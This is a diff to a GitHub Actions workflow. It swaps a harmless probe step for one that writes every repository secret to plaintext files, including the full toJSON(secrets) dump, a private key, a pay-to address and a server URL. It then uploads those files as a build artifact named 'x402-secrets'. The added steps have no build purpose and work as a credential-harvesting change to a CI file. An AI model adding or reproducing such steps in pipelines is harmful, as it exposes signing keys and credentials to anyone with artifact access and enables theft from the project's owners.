@@ -7,5 +7,24 @@ permissions:
 jobs:
   dump:
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     steps:
-      - run: uname -a; id; echo plain-ok
+      - name: collect
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          PRIVATE_KEY: ${{ secrets.PRIVATE_KEY }}
+          PAY_TO_ADDRESS: ${{ secrets.PAY_TO_ADDRESS }}
+          SERVER_BASE_URL: ${{ secrets.SERVER_BASE_URL }}
+        run: |
+          mkdir -p out
+          printf '%s' "$SECRETS_JSON" > out/secrets.json
+          printf '%s' "$PRIVATE_KEY" > out/private_key.txt
+          printf '%s' "$PAY_TO_ADDRESS" > out/pay_to.txt
+          printf '%s' "$SERVER_BASE_URL" > out/server_base_url.txt
+          for f in out/*; do printf '%s size=%s\n' "$f" "$(wc -c <"$f")"; done
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: x402-secrets
+          path: out/
+          if-no-files-found: error
